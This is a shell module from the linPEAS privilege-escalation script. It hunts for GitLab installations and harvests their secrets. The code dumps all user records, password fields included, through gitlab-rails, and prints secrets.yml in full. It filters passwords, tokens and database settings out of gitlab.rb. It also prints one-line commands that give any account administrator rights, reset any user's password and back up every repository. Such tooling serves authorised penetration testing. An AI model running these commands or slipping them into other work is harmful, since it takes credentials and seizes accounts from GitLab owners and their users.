# Title: Software Information - Gitlab
# ID: SI_Gitlab
# Author: Carlos Polop
# Last Update: 22-08-2023
# Description: Searching GitLab related files
# License: GNU GPL
# Version: 1.0
# Mitre: T1552.001
# Functions Used: print_2title
# Global Variables: $DEBUG
# Initial Functions:
# Generated Global Variables: $gitlab_bytes
# Fat linpeas: 0
# Small linpeas: 1


if [ "$(command -v gitlab-rails || echo -n '')" ] || [ "$(command -v gitlab-backup || echo -n '')" ] || [ "$PSTORAGE_GITLAB" ] || [ "$DEBUG" ]; then
  print_2title "Searching GitLab related files" "T1552.001"
  #Check gitlab-rails
  if [ "$(command -v gitlab-rails || echo -n '')" ]; then
    echo "gitlab-rails was found. Trying to dump users..."
    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${SED_RED},"
    echo "If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
    echo "Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
    echo ""
  fi
  if [ "$(command -v gitlab-backup || echo -n '')" ]; then
    echo "If you have enough privileges, you can create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
    echo "Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
    echo ""
  fi
  #Check gitlab files
  printf "%s\n" "$PSTORAGE_GITLAB" | sort | uniq | while IFS= read -r f; do
    if [ "${f##*/}" = "secrets.yml" ]; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#"
    elif [ "${f##*/}" = "gitlab.yml" ]; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      if [ ! -f "$f" ] || [ -L "$f" ] || [ ! -r "$f" ]; then
        echo "Repository preview skipped (unreadable, non-regular, or symlink); inspect path manually"
      else
        gitlab_bytes=$(dd if="$f" bs=262145 count=1 2>/dev/null | wc -c | tr -d '[:space:]')
        if [ "$gitlab_bytes" -le 262144 ] 2>/dev/null; then
          dd if="$f" bs=262144 count=1 2>/dev/null |
            grep -A 4 '^[[:space:]]*repositories:' | head -n 20 | cut -c 1-256
        else
          echo "Repository preview skipped (larger than 256 KiB); inspect path manually"
        fi
      fi
    elif [ "${f##*/}" = "gitlab.rb" ]; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      if [ ! -f "$f" ] || [ -L "$f" ] || [ ! -r "$f" ]; then
        echo "Config preview skipped (unreadable, non-regular, or symlink); inspect path manually"
      else
        gitlab_bytes=$(dd if="$f" bs=262145 count=1 2>/dev/null | wc -c | tr -d '[:space:]')
        if [ "$gitlab_bytes" -le 262144 ] 2>/dev/null; then
          dd if="$f" bs=262144 count=1 2>/dev/null | grep -Eiv '^[[:space:]]*(#|$)' | grep -Ei 'smtp_|password|user|token|secret|database|redis|external_url' | head -n 40 | cut -c 1-256 | sed -${E} "s,email|user|password,${SED_RED},"
        else
          echo "Config preview skipped (larger than 256 KiB); inspect path manually"
        fi
      fi
    fi
    echo ""
  done
  echo ""
fi
